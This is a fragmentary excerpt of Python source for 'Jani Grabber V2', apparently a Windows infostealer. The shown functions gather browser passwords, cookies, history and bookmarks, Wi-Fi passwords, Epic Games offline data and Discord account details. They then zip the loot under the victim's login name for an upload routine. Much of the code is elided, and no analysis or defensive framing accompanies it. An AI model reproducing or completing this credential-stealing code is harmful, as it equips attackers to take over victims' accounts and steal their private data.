    ...
    def file_tree(self, path):
        ...
        for dirpath, dirnames, filenames in os.walk(path):
            ...
            for n, f in enumerate(filenames):
                ...
                if f == f'JaniGrabber-{os.getlogin()}.zip':
                    continue
...
class JanigrabberV2(functions):
    ...
    def browserinfo(self, platform, path):
        p_header = f"Jani Grabber V2 Passwords\nBrowser:{platform}\n\n"
        c_header = f"Jani Grabber V2 Cookies\nBrowser:{platform}\n\n\n"
        h_header = f"Jani Grabber V2 History\nBrowser:{platform}\n\n"
        m_header = f"Jani Grabber V2 Other Info\nBrowser:{platform}\n\n"
        b_header = f"Jani Grabber V2 Bookmarks\nBrowser:{platform}\n\n"
        e_header = f"Jani Grabber V2 Extensions\nBrowser:{platform}\n\n"
        d_header = f"Jani Grabber V2 Download History\nBrowser:{platform}\n\n"
    ...
    def grabwifi(self):
        ...
        for i in profiles:
            ...
            with open(self.dir+"\\Wifi passwords.txt","w") as f:
                f.write(f"Jani Grabber V2 wifi passwords\n\nWi-Fi Name                    | Password\n------------------------------------------\n")
                ...
                for line in f.readlines():
                    if line.startswith("Data="):
                        with open(os.path.join(self.dir, "Epic games data.txt"), 'w', encoding="cp437") as g:
                            g.write(
                                f"Jani grabber V2 Epic Games Offline Data\n\n")
                ...
                if res.status_code == 200:
                    ...
                    if not user_name in username:
                        ...
                        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif" if requests.get(
                            f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.jpg"
    ...
    def upload(self):
        name = os.getlogin()
        _zipfile = os.path.join(self.dir, f'JaniGrabberV2-{os.getlogin()}.zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                if filename == f'JaniGrabberV2-{os.getlogin()}.zip':
                    continue
...
if __name__ == "__main__" and os.name == "nt":
    ...
    try:
        ...
        os._exit(0)
    asyncio.run(JanigrabberV2().init())
